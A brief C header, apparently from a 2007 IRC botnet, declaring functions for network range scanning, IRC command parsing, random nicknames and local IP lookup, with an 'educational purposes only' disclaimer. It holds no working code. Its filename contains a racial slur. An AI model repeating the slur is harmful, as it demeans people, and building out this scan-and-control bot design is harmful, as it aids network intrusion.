/*
 *      niggerbot.h 2007 Ravo_5002
 *      This code is for educational purposes only...
 */

unsigned long rangescan(void *s);
void ircparse(SOCKET ircconn, char ircline[4096]);
unsigned long irc(void *s);
void privmsg_irc(SOCKET ircconn, char *params);
char *randnick(void);
char *getlocalip(void);